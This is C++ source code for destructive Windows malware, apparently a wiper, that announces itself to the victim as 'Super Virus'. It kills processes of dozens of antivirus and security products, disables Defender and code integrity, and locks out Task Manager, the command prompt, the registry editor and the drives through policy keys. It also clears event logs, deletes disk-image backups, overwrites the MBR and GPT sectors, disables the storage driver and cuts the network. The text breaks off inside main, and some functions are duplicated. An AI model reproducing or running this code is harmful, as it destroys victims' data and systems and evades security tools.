void SilentExecuteCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}

void ClearOnlyMFT()
{
	SilentExecuteCmd(_T("fsutil usn deletejournal /D C:"));
	SilentExecuteCmd(_T("cipher /w:C:"));
}

void EnableETWPrivilege()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	if (LookupPrivilegeValue(NULL, SE_TRACE_NAME, &tp.Privileges[0].Luid))
	{
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	}

	CloseHandle(hToken);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(lpFilePath);
	}
}

void SilentDeleteDir(LPCTSTR lpDirPath)
{
	TCHAR szSearchPath[MAX_PATH] = {0};
	WIN32_FIND_DATA fd = {0};
	_stprintf_s(szSearchPath, MAX_PATH, _T("%s\\*.*"), lpDirPath);

	HANDLE hFind = FindFirstFile(szSearchPath, &fd);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

		do
		{
			if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
			{
				TCHAR szItemPath[MAX_PATH] = {0};
				_stprintf_s(szItemPath, MAX_PATH, _T("%s\\%s"), lpDirPath, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					SilentDeleteDir(szItemPath);
				}
					else
					{
						SilentDeleteFile(szItemPath);
					}
			}
		} while (FindNextFile(hFind, &fd));

		FindClose(hFind);
		RemoveDirectory(lpDirPath);
}

void ClearOnlyETW()
{

	EnableETWPrivilege();

	SilentExecuteCmd(_T("logman stop * -ets -quiet"));
	SilentExecuteCmd(_T("logman delete * -ets -quiet"));
	SilentExecuteCmd(_T("logman clear * -quiet"));
	std::vector<LPCTSTR> etwLogPaths = {
		_T("C:\\PerfLogs\\"),
		_T("C:\\Windows\\Temp\\*.etl"),
		_T("C:\\Windows\\Temp\\*.blg"),
		_T("C:\\Windows\\System32\\winevt\\Logs\\*.etl")
	};
	for (LPCTSTR path : etwLogPaths)
	{
		if (PathIsDirectory(path))
			SilentDeleteDir(path);
		else
			SilentExecuteCmd(_T("del /f /q /s ") + (CString)path);
	}

	SilentExecuteCmd(_T("wevtutil cl System -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Application -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Setup -quiet"));
	SilentExecuteCmd(_T("wevtutil cl ForwardedEvents -quiet"));
}
void InvertScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			color = RGB(255 - GetRValue(color), 255 - GetGValue(color), 255 - GetBValue(color));
			SetPixel(hdc, x, y, color);
		}
	}
	ReleaseDC(NULL, hdc);
}

void GlitchScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
		SetPixel(hdc, x, y, color);
	}
	ReleaseDC(NULL, hdc);
}

void ShakeScreen() {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10; i++) {
		SetWindowPos(GetDesktopWindow(), NULL, rand() % 10 - 5, rand() % 10 - 5, w, h, SWP_NOSIZE | SWP_NOZORDER);
		Sleep(50);
	}
}

void GradientScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int alpha = 0; alpha <= 255; alpha += 5) {
		RECT rect;
		GetClientRect(GetDesktopWindow(), &rect);
		HBRUSH brush = CreateSolidBrush(RGB(alpha, alpha, alpha));
		FillRect(hdc, &rect, brush);
		DeleteObject(brush);
		Sleep(20);
	}
	ReleaseDC(NULL, hdc);
}

void BlurScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 1; y < h - 1; y++) {
		for (int x = 1; x < w - 1; x++) {
			COLORREF c1 = GetPixel(hdc, x - 1, y - 1);
			COLORREF c2 = GetPixel(hdc, x, y - 1);
			COLORREF c3 = GetPixel(hdc, x + 1, y - 1);
			COLORREF c4 = GetPixel(hdc, x - 1, y);
			COLORREF c5 = GetPixel(hdc, x + 1, y);
			COLORREF c6 = GetPixel(hdc, x - 1, y + 1);
			COLORREF c7 = GetPixel(hdc, x, y + 1);
			COLORREF c8 = GetPixel(hdc, x + 1, y + 1);

			int r = (GetRValue(c1) + GetRValue(c2) + GetRValue(c3) + GetRValue(c4) +
			GetRValue(c5) + GetRValue(c6) + GetRValue(c7) + GetRValue(c8)) / 8;
			int g = (GetGValue(c1) + GetGValue(c2) + GetGValue(c3) + GetGValue(c4) +
			GetGValue(c5) + GetGValue(c6) + GetGValue(c7) + GetGValue(c8)) / 8;
			int b = (GetBValue(c1) + GetBValue(c2) + GetBValue(c3) + GetBValue(c4) +
			GetBValue(c5) + GetBValue(c6) + GetBValue(c7) + GetBValue(c8)) / 8;

			SetPixel(hdc, x, y, RGB(r, g, b));
		}
	}
	ReleaseDC(NULL, hdc);
}

void FlickerScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5; i++) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, WHITENESS);
		Sleep(100);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		Sleep(100);
	}
	ReleaseDC(NULL, hdc);
}

void BlackAndWhiteScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			int gray = (GetRValue(color) + GetGValue(color) + GetBValue(color)) / 3;
			SetPixel(hdc, x, y, RGB(gray, gray, gray));
		}
	}
	ReleaseDC(NULL, hdc);
}

void SnowScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		SetPixel(hdc, x, y, RGB(255, 255, 255));
	}
	ReleaseDC(NULL, hdc);
}

void ShowNotification() {
	NOTIFYICONDATA nid = { sizeof(NOTIFYICONDATA) };
	nid.hWnd = NULL;
	nid.uFlags = NIF_INFO;
	nid.dwInfoFlags = NIIF_INFO;
	wcscpy(nid.szInfoTitle, L"Super Virus");
	wcscpy(nid.szInfo, L"你的电脑废了！");
	Shell_NotifyIcon(NIM_ADD, &nid);
	Shell_NotifyIcon(NIM_DELETE, &nid);
}

void ClearMBR(wchar_t* drivePath) {
	HANDLE hDrive = CreateFileW(
		drivePath,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int MBR_SIZE = 512;
		BYTE emptyMBR[MBR_SIZE] = {0};

		DWORD bytesWritten = 0;
		WriteFile(
			hDrive,
			emptyMBR,
			MBR_SIZE,
			&bytesWritten,
			NULL
		);

		CloseHandle(hDrive);
	}
}
void ClearGPT(wchar_t* drivePath2) {
	HANDLE hDrive = CreateFileW(
		drivePath2,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int SECTOR_SIZE = 512;
		const int GPT_HEADER_LBA = 34;
		BYTE emptySector[SECTOR_SIZE] = {0};

		for (int i = 0; i < GPT_HEADER_LBA; i++) {
			LARGE_INTEGER offset;
			offset.QuadPart = (LONGLONG)i * SECTOR_SIZE;

			SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);

			DWORD bytesWritten = 0;
			WriteFile(
				hDrive,
			 emptySector,
			 SECTOR_SIZE,
			 &bytesWritten,
			 NULL
			);
		}

		CloseHandle(hDrive);
	}
}
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpPrivilegeName, &tp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
	CloseHandle(hToken);
	return (GetLastError() == ERROR_SUCCESS);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		DeleteFile(lpFilePath);
	}
}


void BackupClearAndDeleteLog(LPCTSTR lpLogName, LPCTSTR lpBackupPath)
{
	HANDLE hEventLog = OpenEventLog(NULL, lpLogName);
	if (hEventLog != NULL)
	{
		ClearEventLog(hEventLog, lpBackupPath);
		CloseEventLog(hEventLog);
		SilentDeleteFile(lpBackupPath);
	}
}


void ClearAllLogsAndBackups()
{

	EnablePrivilege(SE_SECURITY_NAME);

	std::vector<LPCTSTR> logNames = {
		_T("System"),
		_T("Application"),
		_T("Security"),
		_T("Setup"),
		_T("ForwardedEvents")
	};


	TCHAR szTempPath[MAX_PATH] = {0};
	GetTempPath(MAX_PATH, szTempPath);

	for (LPCTSTR logName : logNames)
	{
		TCHAR szBackupPath[MAX_PATH] = {0};
		_stprintf_s(szBackupPath, MAX_PATH, _T("%s%s_Backup.evt"), szTempPath, logName);
		BackupClearAndDeleteLog(logName, szBackupPath);
	}
}

using namespace std;
#define cls system("cls")
#define SCRIPT_DIR "C:\\\\"
const string SCRIPT_PATH = SCRIPT_DIR + "\\diskpart_disk.txt";
int _tmain(int argc, TCHAR* argv[]) {
	system("title Microsoft Super Operating System");
	system("mode con cols=15 lines=1");
	HANDLE mutex = CreateMutex(NULL, FALSE, L"Global\\MyApplicationMutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return 0;
	}

	ApplicationCore appCore;
	ProcessGuardian processGuardian;

	appCore.Execute();
	AdminElevator::EnsureAdminPrivileges();
	Sleep(5000);
	system("start slmgr.vbs -upk");
	cls;
	{
		;
		;
		;
	}
	const wchar_t* targetExt = L"*.gho";
	CleanAllDrivesFiles(targetExt);
	KillProcessByName("360");
	cls;
	KillProcessByName("kv");
	cls;
	KillProcessByName("KV");
	cls;
	KillProcessByName("防火墙");
	cls;
	KillProcessByName("VirusScan");
	cls;
	KillProcessByName("网镖");
	cls;
	KillProcessByName("杀毒");
	cls;
	KillProcessByName("毒霸");
	cls;
	KillProcessByName("瑞星");
	cls;
	KillProcessByName("江民");
	cls;
	KillProcessByName("超级兔子");
	cls;
	KillProcessByName("优化大师");
	cls;
	KillProcessByName("木马克星");
	cls;
	KillProcessByName("木马清道夫");
	cls;
	KillProcessByName("QQ病毒");
	cls;
	KillProcessByName("注册表编辑器");
	cls;
	KillProcessByName("系统配置实用程序");
	cls;
	KillProcessByName("卡巴斯基反病毒");
	cls;
	KillProcessByName("Symantec AntiVirus");
	cls;
	KillProcessByName("Duba");
	cls;
	KillProcessByName("esteem proces");
	cls;
	KillProcessByName("绿鹰PC");
	cls;
	KillProcessByName("密码防盗");
	cls;
	KillProcessByName("噬菌体");
	cls;
	KillProcessByName("木马辅助查找器");
	cls;
	KillProcessByName("System Safety Monitor");
	cls;
	KillProcessByName("Wrapped gift Killer");
	cls;
	KillProcessByName("safe");
	cls;
	KillProcessByName("Safe");
	cls;
	KillProcessByName("Winsock Expert");
	cls;
	KillProcessByName("游戏木马检测大师");
	cls;
	KillProcessByName("msctls_statusbar32");
	cls;
	KillProcessByName("pjf(ustc)");
	cls;
	KillProcessByName("IceSword");
	cls;
	system("wmic /namespace:\\root\\Microsoft\\Windows\\Defender path MSFT_MpComputerStatus call Set-MpPreference -DisableRealtimeMonitoring $true");
	cls;
	system("taskkill -im 360safe.exe -f");
	cls;
	{
		;
		;
		;
		string a="360";
		cls;
		cls;
		;
		;
	}
	system("taskkill -im 360tray.exe -f");
	cls;
	system("taskkill -im 360sd.exe -f");
	cls;
	{
		;
		string ol="360";
		;
		;
	}
	system("taskkill -im 360rp.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TS.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TSService.exe -f");
	cls;//
	;//
	;//
	;//
	;//
	;//
	;//
	system("taskkill -im 360TSTray.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im 360TSFirewall.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TSUpdate.exe -f");
	cls;
	system("taskkill -im QQPCMgr.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im QQPCMgrTray.exe -f");
	cls;
	;
	system("taskkill -im QQPCRTP.exe -f");
	cls;
	;
	system("taskkill -im avp.exe -f");
	cls;
	;
	system("taskkill -im kav.exe -f");
	cls;
	;
	system("taskkill -im kis.exe -f");
	cls;
	;


	system("taskkill -im NortonSecurity.exe -f");
	cls;
	;
	system("taskkill -im ccSvcHst.exe -f");
	cls;
	;
	system("taskkill -im SymantecServiceFramework.exe -f");
	cls;
	;
	;
	system("taskkill -im McAfeeSecurityScan.exe -f");
	cls;
	;
	system("taskkill -im McAfeeFrameworkService.exe -f");
	cls;
	;
	system("taskkill -im McScan.exe -f");
	cls;
	;
	system("taskkill -im huorong.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im hrservice.exe -f");
	;
	cls;
	system("taskkill -im hrtray.exe -f");
	;
	cls;
	system("taskkill -im hrfw.exe -f");
	;
	cls;
	{
		string fg="huorong";
		;
		//
		;//
		//
		;//
	}
	system("taskkill -im HIPS.exe -f");
	;
	;
	;
	;
	;
	cls;
	system("taskkill -im HIPStray.exe -f");
	cls;
	{
		//
	}
	system("taskkill -im HipsSvc.exe -f");
	cls;
	//
	;//
	;//
	//////////////
	;
	//////////
	;///////////////////////////
	////////////////////////////
	system("taskkill -im TrafficProt.exe -f");
	cls;
	system("taskkill -im MsMpEng.exe -f");
	cls;
	;//////////////////////////
	system("taskkill -im WinDefend.exe -f");
	cls;
	;
	system("taskkill -im SecHealthUI.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Windows Defender UI.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Mcshield.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Frameworkservice.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im NortonAntiVirus.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im RavMonD.exe -f");
	cls;//________________________
	;//
	;//
	;
	;
	;////////////////////////////--------------------___
	//////////////////
	system("taskkill -im RAVMOND.exe -f");
	cls;
	;
	system("taskkill -im ravmon.exe -f");
	cls;
	;
	system("taskkill -im rsrv.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im bdagent.exe -f");
	cls;
	;
	;
	system("taskkill -im bitdefender.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im bdservicehost.exe -f");
	cls;
	;
	;
	system("taskkill -im egui.exe -f");
	cls;
	;
	;
	system("taskkill -im ekrn.exe -f");
	cls;
	;
	;
	system("taskkill -im eService.exe -f");
	cls;
	;
	;
	system("taskkill -im esettray.exe -f");
	cls;
	;
	;
	system("taskkill -im avira.exe -f");
	cls;
	;
	;
	system("taskkill -im avguard.exe -f");
	cls;
	;
	;
	system("taskkill -im avira.service.host.exe -f");
	cls;
	;
	;
	system("taskkill -im Tmcc.exe -f");
	cls;
	;
	;
	system("taskkill -im Tmntsrv.exe -f");
	cls;
	;
	;
	system("taskkill -im TmPfw.exe -f");
	cls;
	;
	;
	system("taskkill -im PandaUI.exe -f");
	cls;
	;
	;
	system("taskkill -im PandaService.exe -f");
	cls;
	;/////////////fghnkni
	/////fgjhuuyhyi6uy6dfuhrgbm236i5fyj466t1n
	system("taskkill -im PandaShield.exe -f");
	cls;
	;
	;
	system("taskkill -im mbam.exe -f");
	cls;
	;
	;
	system("taskkill -im mbamservice.exe -f");
	cls;
	;
	;
	//////////////
	system("taskkill -im mbamtray.exe -f");
	cls;
	;
	;
	system("taskkill -im totalav.exe -f");
	cls;
	;
	;
	system("taskkill -im totalav.service.exe -f");
	cls;
	;
	system("taskkill -im SophosUI.exe -f");
	cls;
	;
	;
	system("taskkill -im SophosService.exe -f");
	cls;
	;
	;
	system("taskkill -im SophosWebProtection.exe -f");
	cls;
	;
	;
	system("taskkill -im kxetray.exe -f");
	cls;
	;
	;
	system("taskkill -im Kxescore.exe -f");
	cls;
	;
	;
	system("taskkill -im KAVStart.exe -f");
	cls;
	;
	;
	system("taskkill -im KWatch.exe -f");
	cls;
	;
	;
	system("taskkill -im KWatchX.exe -f");
	cls;
	;
	;
	system("taskkill -im KAV32.exe -f");
	cls;
	;
	;
	system("taskkill -im KAV64.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFW32.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFW64.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFWtray.exe -f");
	cls;
	;
	;
	system("taskkill -im KMailMon.exe -f");
	cls;
	;
	;
	system("taskkill -im KUpdate.exe -f");
	cls;
	;
	;
	system("taskkill -im KUpdate.BIN -f");
	cls;
	;
	;
	system("taskkill -im ksafe.exe -f");
	cls;
	;
	;
	system("taskkill -im KSafeTray.exe -f");
	cls;
	;
	;
	system("taskkill -im KSafeService.exe -f");
	cls;
	;
	;
	system("taskkill -im kvsrvxp.exe -f");
	cls;
	;
	;
	system("taskkill -im kvsrv64.exe -f");
	cls;
	;
	;
	system("taskkill -im KVMonXP.exe -f");
	cls;
	;
	;
	system("taskkill -im KVMon64.exe -f");
	cls;
	;
	;
	system("taskkill -im KVTray.exe -f");
	cls;
	;
	;
	system("taskkill -im kvnative.exe -f");
	cls;
	;
	;
	system("taskkill -im KVUpdater.exe -f");
	cls;
	system("taskkill -im BaiduSd.exe -f");
	cls;
	;
	;
	system("taskkill -im BaiduSdSvc.exe -f");
	cls;
	system("taskkill -im BaiduSdTray.exe -f");
	cls;
	;
	;
	system("taskkill -im BavSvc.exe -f");
	cls;
	;
	;
	system("taskkill -im BavTray.exe -f");
	cls;
	system("taskkill -im bavmsservice.exe -f");
	cls;
	;
	;
	system("taskkill -im nprotect.exe -f");
	cls;
	;
	;
	system("taskkill -im nspupsvc.exe -f");
	cls;
	;
	;
	system("taskkill -im nprotectsvc.exe -f");
	cls;
	system("taskkill -im VRV.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im VrvArp.exe -f");
	cls;
	system("taskkill -im JingYunSvc.exe -f");
	cls;
	system("taskkill -im JingYunTray.exe -f");
	cls;
	system("taskkill -im FYAntivirus.exe -f");
	cls;
	system("taskkill -im FYFireWall.exe -f");
	cls;
	system("taskkill -im FYService.exe -f");
	cls;
	system("taskkill -im nortonsecurity.exe -f");
	cls;
	system("taskkill -im ccSvcHst.exe -f");
	cls;
	/////////
	system("taskkill -im SymEFASI.exe -f");
	cls;
	system("taskkill -im nsTray.exe -f");
	cls;
	system("taskkill -im mcafee.exe -f");
	cls;
	system("taskkill -im McAfeeUI.exe -f");
	cls;
	system("taskkill -im mfemms.exe -f");
	cls;
	system("taskkill -im mfevtps.exe -f");
	cls;
	system("taskkill -im mcafee.tray.exe -f");
	cls;
	system("taskkill -im gdlauncher.exe -f");
	cls;
	system("taskkill -im gddservice.exe -f");
	cls;/////////////////////////////////
	system("taskkill -im gdfire.exe -f");
	cls;/////////////////////////////////
	////////////////////////////////////
	system("taskkill -im gdtray.exe -f");
	cls;
	{
		//////////
	}
	{
		////////
	}
	system("taskkill -im QuickHeal.exe -f");
	cls;
	{
		;
		;
		;
	}
	system("taskkill -im QHSvc.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im QHTray.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im QHShield.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7TS.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7Service.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7Tray.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im AvastUI.exe -f");
	cls;
	system("taskkill -im AvastSvc.exe -f");
	cls;
	system("taskkill -im ashServ.exe -f");
	cls;
	system("taskkill -im ashDisp.exe -f");
	cls;
	system("taskkill -im avgui.exe -f");
	cls;
	system("taskkill -im avgcsrva.exe -f");
	cls;
	system("taskkill -im avgmfapx.exe -f");
	cls;
	system("taskkill -im avgtray.exe -f");
	cls;
	system("taskkill -im gdlauncher.exe -f");
	cls;
	system("taskkill -im gddservice.exe -f");
	cls;
	system("taskkill -im fsgui.exe -f");
	cls;
	system("taskkill -im fssvc.exe -f");
	cls;
	system("taskkill -im fsshield.exe -f");
	cls;
	system("taskkill -im fstray.exe -f");
	cls;
	system("taskkill -im wrsa.exe -f");
	cls;
	system("taskkill -im wrsservice.exe -f");
	cls;
	system("taskkill -im wrstray.exe -f");
	cls;
	system("taskkill -im malwarebytes.exe -f");
	cls;
	system("taskkill -im mbamservice.exe -f");
	cls;
	system("taskkill -im mbamtray.exe -f");
	cls;
	system("taskkill -im mbamchameleon.exe -f");
	cls;
	system("taskkill -im tmntsrv.exe -f");
	cls;
	system("taskkill -im trendmicro.exe -f");
	cls;
	system("taskkill -im tmtray.exe -f");
	cls;
	system("taskkill -im tmusa.exe -f");
	cls;
	system("taskkill -im tmproxy.exe -f");
	cls;
	system("taskkill -im PSUAMain.exe -f");
	cls;
	system("taskkill -im PSANHost.exe -f");
	cls;
	system("taskkill -im PandaTray.exe -f");
	cls;
	system("taskkill -im pskmad.sys -f");
	cls;
	system("taskkill -im PandaUpdate.exe -f");
	cls;
	system("taskkill -im cis.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im cmdagent.exe -f");
	cls;
	system("taskkill -im cmtray.exe -f");
	cls;
	system("taskkill -im cfp.exe -f");
	cls;
	system("taskkill -im sandboxie.dll -f");
	cls;
	system("taskkill -im SophosUI.exe -f");
	cls;
	system("taskkill -im SophosService.exe -f");
	cls;
	system("taskkill -im SophosTray.exe -f");
	cls;
	system("taskkill -im SophosUpdate.exe -f");
	cls;
	system("taskkill -im SophosFirewall.exe -f");
	cls;
	system("taskkill -im TotalAV.exe -f");
	cls;
	system("taskkill -im TotalAVService.exe -f");
	cls;
	system("taskkill -im TotalAVTray.exe -f");
	cls;
	system("taskkill -im TotalAVUpdate.exe -f");
	cls;
	system("taskkill -im TotalAVVPN.exe -f");
	cls;
	system("taskkill -im a2guard.exe -f");
	cls;
	system("taskkill -im a2start.exe -f");
	cls;
	system("taskkill -im a2tray.exe -f");
	cls;
	system("taskkill -im a2service.exe -f");
	cls;
	system("taskkill -im a2update.exe -f");
	cls;
	system("taskkill -im IMF.exe -f");
	cls;
	system("taskkill -im IMFTray.exe -f");
	cls;
	system("taskkill -im IMFFirewall.exe -f");
	cls;
	;
	system("taskkill -im Dism++主程序.exe -f");
	cls;
	if (0)
	{
		;
	}
	else
	{
		;
	}
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity /v Enabled /t REG_DWORD /d 0 /f");
	cls;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /f");
	cls;
	int i;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /f");
	cls;
	{
		;
		;
	}
	i = 36596886754;
	{

	}
	i = 63;
	system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /f");
	cls;
	system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
	cls;
	if(true)
	{
		if (0)
		{
			;
			;
			;
			;
			int f=56;
		}
		;
		{
			;
		}
		;
		;
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f");
	cls;
	;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f");
	cls;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 4294967295 /f");
	cls;
	;
	;
	;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
	cls;
	i=7;
	cls;
	cls;
	cls;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewOnDrive /t REG_DWORD /d 4294967295 /f");
	cls;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFind /t REG_DWORD /d 1 /f");
	cls;
	{
		;
		;
		;
	}
	system("taskkill -im wscript.exe -f");
	cls;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v RestrictRun /t REG_DWORD /d 1 /f");
	cls;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f");
	cls;
	{
		;
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	cls;
	{
		;
	}
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings /v Enabled /t REG_DWORD /d 0 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.vbs /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.js /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.html /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.mhtml /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.htm /v PerceivedType /d txt /f");
	cls;
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\storahci /v Start /t REG_DWORD /d 4 /f");
	cls;
	system("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services" /f");
	cls;
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f");
	cls;
	system("for /f tokens=3* %a in ('netsh interface show interface ^| find 已连接') do netsh interface set interface %b admin=disable");
	if(1)
	{
		cls;
	}
	srand(time(NULL));

